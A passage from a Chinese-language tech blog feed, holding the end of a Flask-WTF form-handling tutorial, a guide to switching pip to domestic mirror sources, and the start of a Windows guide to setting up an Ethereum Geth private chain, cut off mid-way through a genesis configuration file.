tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Enter your username<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        {{ form.hidden_tag() }}  <span class="token comment">&lt;!-- 防止 CSRF 攻击 --&gt;</span>        {{ form.username.label }} {{ form.username(size=20) }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>        {% for error in form.username.errors %}            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>[{{ error }}]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>        {% endfor %}        {{ form.submit() }}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>{{ form.hidden_tag() }}</code>：生成隐藏的 CSRF 令牌，增强安全性。</li><li>使用 <code>{% for error in form.username.errors %}</code> 循环显示字段的验证错误。</li></ul><h3 id="6-处理表单错误"><a href="#6-处理表单错误" class="headerlink" title="6. 处理表单错误"></a>6. 处理表单错误</h3><p>如果表单验证失败，Flask-WTF 会自动将错误信息存储在字段的 <code>errors</code> 属性中。在模板中，可以通过条件判断显示相应的错误消息。</p><h3 id="7-完整示例-1"><a href="#7-完整示例-1" class="headerlink" title="7. 完整示例"></a>7. 完整示例</h3><p>以下是一个完整的 Flask 应用示例，展示了如何使用 Flask-WTF 处理表单。</p><h4 id="项目结构-2"><a href="#项目结构-2" class="headerlink" title="项目结构"></a>项目结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">my_flask_app/├── app.py                   <span class="token comment"># Flask 应用主文件</span>└── templates/    └── index.html          <span class="token comment"># 表单模板</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="app-py-1"><a href="#app-py-1" class="headerlink" title="app.py"></a><code>app.py</code></h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">码<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token keyword">from</span> flask_wtf <span class="token keyword">import</span> FlaskForm<span class="token keyword">from</span> wtforms <span class="token keyword">import</span> StringField<span class="token punctuation">,</span> SubmitField<span class="token keyword">from</span> wtforms<span class="token punctuation">.</span>validators <span class="token keyword">import</span> DataRequiredapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'your_secret_key'</span>  <span class="token comment"># 设置安全密钥</span><span class="token keyword">class</span> <span class="token class-name">MyForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> StringField<span class="token punctuation">(</span><span class="token string">'Username'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    submit <span class="token operator">=</span> SubmitField<span class="token punctuation">(</span><span class="token string">'Submit'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span class="token operator">=</span> MyForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 验证表单数据</span>        username <span class="token operator">=</span> form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data  <span class="token comment"># 获取输入的用户名</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Hello, </span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">!'</span></span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="templates-index-html-1"><a href="#templates-index-html-1" class="headerlink" title="templates/index.html"></a><code>templates/index.html</code></h4><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Flask Form Example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Enter your username<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        {{ form.hidden_tag() }}  <span class="token comment">&lt;!-- 防止 CSRF 攻击 --&gt;</span>        {{ form.username.label }} {{ form.username(size=20) }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>        {% for error in form.username.errors %}            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>[{{ error }}]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>        {% endfor %}        {{ form.submit() }}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="8-添加更多字段和验证器"><a href="#8-添加更多字段和验证器" class="headerlink" title="8. 添加更多字段和验证器"></a>8. 添加更多字段和验证器</h3><p>可以使用 <code>WTForms</code> 提供的多种字段类型和验证器来扩展表单功能。例如，可以添加 <code>EmailField</code>、<code>PasswordField</code>、<code>SelectField</code> 等。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> wtforms <span class="token keyword">import</span> EmailField<span class="token punctuation">,</span> PasswordField<span class="token punctuation">,</span> SelectField<span class="token keyword">class</span> <span class="token class-name">ExtendedForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> StringField<span class="token punctuation">(</span><span class="token string">'Username'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    email <span class="token operator">=</span> EmailField<span class="token punctuation">(</span><span class="token string">'Email'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> PasswordField<span class="token punctuation">(</span><span class="token string">'Password'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    options <span class="token operator">=</span> SelectField<span class="token punctuation">(</span><span class="token string">'Options'</span><span class="token punctuation">,</span> choices<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'opt1'</span><span class="token punctuation">,</span> <span class="token string">'Option 1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'opt2'</span><span class="token punctuation">,</span> <span class="token string">'Option 2'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    submit <span class="token operator">=</span> SubmitField<span class="token punctuation">(</span><span class="token string">'Submit'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="9-处理文件上传"><a href="#9-处理文件上传" class="headerlink" title="9. 处理文件上传"></a>9. 处理文件上传</h3><p>Flask-WTF 也支持文件上传，可以使用 <code>FileField</code>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> wtforms <span class="token keyword">import</span> FileField<span class="token keyword">class</span> <span class="token class-name">UploadForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">file</span> <span class="token operator">=</span> FileField<span class="token punctuation">(</span><span class="token string">'File'</span><span class="token punctuation">)</span>    submit <span class="token operator">=</span> SubmitField<span class="token punctuation">(</span><span class="token string">'Upload'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span class="token operator">=</span> UploadForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">file</span> <span class="token operator">=</span> form<span class="token punctuation">.</span><span class="token builtin">file</span><span class="token punctuation">.</span>data        <span class="token comment"># 处理文件上传</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'File </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">}</span></span><span class="token string"> uploaded successfully!'</span></span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="10-保护表单安全"><a href="#10-保护表单安全" class="headerlink" title="10. 保护表单安全"></a>10. 保护表单安全</h3><p>使用 <code>SECRET_KEY</code> 保护表单，防止 CSRF 攻击，确保所有表单都使用 <code>form.hidden_tag()</code> 生成 CSRF 令牌。</p><h2 id="出现找不到渲染文件index-html"><a href="#出现找不到渲染文件index-html" class="headerlink" title="出现找不到渲染文件index.html"></a>出现找不到渲染文件index.html</h2><p>检查目录结构，添加这个template_folder=’app/templates’创建框架</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> template_folder<span class="token operator">=</span><span class="token string">'app/templates'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接点说python需要从你的路由所在路径找起， template_folder就是指定路径，加入你的路由在app文件夹下，不用指定路径就能直接找到，在外面，例如和app同级，就可以写路径为<code>.app/templates</code>，记住最重要的是你的路由所在位置算起。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pip换源</title>
      <link href="/2024/11/03/pip-huan-yuan/"/>
      <url>/2024/11/03/pip-huan-yuan/</url>
      
        <content type="html"><![CDATA[<h1 id="pip换源"><a href="#pip换源" class="headerlink" title="pip换源"></a>pip换源</h1><h3 id="1-临时换源"><a href="#1-临时换源" class="headerlink" title="1. 临时换源"></a>1. 临时换源</h3><p>临时换源是在安装某个包时指定使用特定的源，而不改变全局配置。例如，使用清华大学源安装一个包的命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> package_name <span class="token parameter variable">-i</span> https://pypi.tuna.tsinghua.edu.cn/simple<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中<code>package_name</code>是您要安装的包的名称。</p><h3 id="2-永久换源"><a href="#2-永久换源" class="headerlink" title="2. 永久换源"></a>2. 永久换源</h3><p>永久换源是通过修改pip的配置文件来实现的，这样每次使用pip时都会默认使用指定的源。</p><h4 id="2-1-找到pip配置文件的位置"><a href="#2-1-找到pip配置文件的位置" class="headerlink" title="2.1 找到pip配置文件的位置"></a>2.1 找到pip配置文件的位置</h4><ul><li><strong>Unix/Linux/MacOS</strong>: <code>~/.pip/pip.conf</code></li><li><strong>Windows</strong>: <code>%APPDATA%\pip\pip.ini</code></li></ul><p>如果配置文件不存在，可以手动创建。</p><h4 id="2-2-编辑pip配置文件"><a href="#2-2-编辑pip配置文件" class="headerlink" title="2.2 编辑pip配置文件"></a>2.2 编辑pip配置文件</h4><ul><li><p>Unix/Linux/MacOS: 打开或创建<code>~/.pip/pip.conf</code>文件，并添加以下内容：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>Windows: 打开或创建<code>%APPDATA%\pip\pip.ini</code>文件，并添加以下内容：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中<code>https://pypi.tuna.tsinghua.edu.cn/simple</code>可以替换为您选择的其他源的URL。</p></li></ul><h4 id="2-3-命令"><a href="#2-3-命令" class="headerlink" title="2.3 命令"></a>2.3 命令</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 清华源</span>pip config <span class="token builtin class-name">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-重置镜像源"><a href="#3-重置镜像源" class="headerlink" title="3. 重置镜像源"></a>3. 重置镜像源</h3><p>如果您需要重置镜像源到默认的PyPI官方源，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip config <span class="token builtin class-name">unset</span> global.index-url<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会将全局设置的镜像源删除，恢复到默认设置。</p><h3 id="4-验证和测试"><a href="#4-验证和测试" class="headerlink" title="4. 验证和测试"></a>4. 验证和测试</h3><p>您可以通过以下命令检查当前pip配置的源：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip config list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后尝试安装一个包来测试配置是否生效。</p><h3 id="5-国内常用源地址"><a href="#5-国内常用源地址" class="headerlink" title="5. 国内常用源地址"></a>5. 国内常用源地址</h3><p>以下是一些国内常用的pip源地址，供您选择使用：</p><ul><li>清华大学源：<code>https://pypi.tuna.tsinghua.edu.cn/simple</code></li><li>阿里云源：<code>https://mirrors.aliyun.com/pypi/simple</code></li><li>豆瓣源：<code>https://pypi.douban.com/simple</code></li><li>中国科学技术大学源：<code>https://pypi.mirrors.ustc.edu.cn/simple</code></li><li>腾讯云源：<code>https://mirrors.cloud.tencent.com/pypi/simple</code></li><li>官方源：<code>https://pypi.org/simple</code></li></ul><p>在pip镜像升级报警，只需要添加信任源即可：</p><ul><li><p>临时换源处理</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> beautifulsoup4 --trusted-host mirrors.aliyun.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>更换默认源配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>install<span class="token punctuation">]</span>trusted-host<span class="token operator">=</span>pypi.douban.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h3 id="设置本地代理"><a href="#设置本地代理" class="headerlink" title="设置本地代理"></a>设置本地代理</h3><p>2.2配置文件中加入下面</p><pre class="line-numbers language-none"><code class="language-none">proxy = http://[用户名:密码@]代理地址:端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>以太坊 DApp 开发-Geth 私链环境搭建-Windows 平台</title>
      <link href="/2024/10/16/yi-tai-fang-dapp-kai-fa-geth-si-lian-huan-jing-da-jian-windows-ping-tai/"/>
      <url>/2024/10/16/yi-tai-fang-dapp-kai-fa-geth-si-lian-huan-jing-da-jian-windows-ping-tai/</url>
      
        <content type="html"><![CDATA[<h1 id="以太坊-DApp-开发-Geth-私链环境搭建-Windows-平台"><a href="#以太坊-DApp-开发-Geth-私链环境搭建-Windows-平台" class="headerlink" title="以太坊 DApp 开发-Geth 私链环境搭建-Windows 平台"></a>以太坊 DApp 开发-Geth 私链环境搭建-Windows 平台</h1><h2 id="一、安装-DApp-开发环境"><a href="#一、安装-DApp-开发环境" class="headerlink" title="一、安装 DApp 开发环境"></a>一、安装 DApp 开发环境</h2><h3 id="1-1-安装-Node-js"><a href="#1-1-安装-Node-js" class="headerlink" title="1.1 安装 Node.js"></a>1.1 安装 Node.js</h3><p>看我这篇<a href="https://0xdadream.github.io/2024/01/20/node.js-ban-ben-wen-ti/">node.js版本问题 | 逐梦 (0xdadream.github.io)</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">node</span> <span class="token parameter variable">--version</span>v22.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="1-2-安装-Geth"><a href="#1-2-安装-Geth" class="headerlink" title="1.2 安装 Geth"></a>1.2 安装 Geth</h3><p><a href="https://geth.ethereum.org/downloads">Downloads | go-ethereum</a></p><p>下载 64 位<a href="https://gethstore.blob.core.windows.net/builds/geth-windows-amd64-1.8.3-329ac18e.exe">https://gethstore.blob.core.windows.net/builds/geth-windows-amd64-1.8.3-329ac18e.exe</a></p><p>或者 32 位<a href="https://gethstore.blob.core.windows.net/builds/geth-windows-386-1.8.3-329ac18e.exe">https://gethstore.blob.core.windows.net/builds/geth-windows-386-1.8.3-329ac18e.exe</a> </p><p>Geth 安装程序,然后进行安装。 安装完毕后打开一个控制台,执行命令验证安装成功:  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth versionGethVersion: <span class="token number">1.8</span>.3-stable <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="1-3-安装-solidity-编译器"><a href="#1-3-安装-solidity-编译器" class="headerlink" title="1.3 安装 solidity 编译器"></a>1.3 安装 solidity 编译器</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> solc <span class="token parameter variable">-g</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  安装完毕后,执行命令验证安装成功 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">solcjs <span class="token parameter variable">-V</span><span class="token number">0.8</span>.28+commit.7893614a.Emscripten.clang<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="1-4-安装-web3"><a href="#1-4-安装-web3" class="headerlink" title="1.4 安装 web3"></a>1.4 安装 web3</h3><p>Web3 的安装过程使用了 git,因此需要先安装 windows 版的 git 命令行<a href="https://0xdadream.github.io/2024/08/09/git-shi-yong/">git使用 | 逐梦 (0xdadream.github.io)</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> web3 <span class="token parameter variable">-g</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>验证，创建一个文件<code>index.js</code>,写入以下内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">const <span class="token punctuation">{</span> Web3 <span class="token punctuation">}</span> <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">'web3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console.log<span class="token punctuation">(</span><span class="token string">"Version:"</span>,Web3.version<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>运行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">node</span> index.jsVersion: <span class="token number">4.13</span>.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="1-5-安装-truffle-框架"><a href="#1-5-安装-truffle-框架" class="headerlink" title="1.5 安装 truffle 框架"></a>1.5 安装 truffle 框架</h3><p> 执行以下命令安装 truffle 开发框架: </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> truffle<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>验证安装:  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">truffle.cmd versionTruffle v5.11.5 <span class="token punctuation">(</span>core: <span class="token number">5.11</span>.5<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="1-6-安装-webpack"><a href="#1-6-安装-webpack" class="headerlink" title="1.6 安装 webpack"></a>1.6 安装 webpack</h3><p>执行以下命令安装 webpack:  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> webpack –g <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>验证安装  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">webpack <span class="token parameter variable">-h</span>Usage: webpack <span class="token punctuation">[</span>entries<span class="token punctuation">..</span>.<span class="token punctuation">]</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span>Alternative usage to run commands: webpack <span class="token punctuation">[</span>command<span class="token punctuation">]</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="二、运行私链节点"><a href="#二、运行私链节点" class="headerlink" title="二、运行私链节点"></a>二、运行私链节点</h2><h3 id="2-1-创世块配置"><a href="#2-1-创世块配置" class="headerlink" title="2.1 创世块配置"></a>2.1 创世块配置</h3><p>创建一个节点目录 node1,并在其中创建私链的创世块配置文件:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> node1<span class="token builtin class-name">cd</span> node1notepad gensis.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后编辑内容如下:</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"config"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"chainId"</span><span class="token operator">:</span> <span class="token number">987</span><span class="token punctuation">,</span>        <span class="token property">"homesteadBlock"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"eip155Block"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"eip158Block"</span><span class="token operator">:</span> <span class="token number">0</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"difficulty"</span><span class="token operator">:</span> <span class="token string">"200"</span><span class="token punctuation">,</span>    <span class="token property">"gasLimit"</span><span class="token operator">:</span> <span class="token string">"2100000"</span><span class="token punctuation">,</span>    <span class="token property">"alloc"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"7df9a875a174b3bc565e6424a0050ebc1b2d1d82"</span><span class="token operator">:</span> <span class="token punctuation">{</span>            <span class="token property">"balance"</span><span class="token operator">:</span> <span class="token string">"300000"</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"f41c74c9ae680c1aa78f42e5647a62f353b7bdde"</span><span class="token operator">:</span> <span class="token punctuation">{</span>            <span class="token property">"balance"</span><span class="token operator">:</span> <span class="token string">"400000"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>config.chainId</code>用来声明以太坊网络编号,选择一个大于 10 的数字即可。  <code>difficulty</code> 用来声明挖矿难度,越小的值难度越低,也就能更快速地出块。</p><p>完整版的 <code>gensis.json</code> 如下所示</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"config"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"chainId"</span><span class="token operator">:</span> <span class="token number">987</span><span class="token punctuation">,</span>      <span class="token property">"homesteadBlock"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>      <span class="token property">"eip155Block"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>      <span class="token property">"eip158Block"</span><span class="token operator">:</span> <span class="token number">0</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"difficulty"</span><span class="token operator">:</span> <span class="token string">"0x400"</span><span class="token punctuation">,</span>  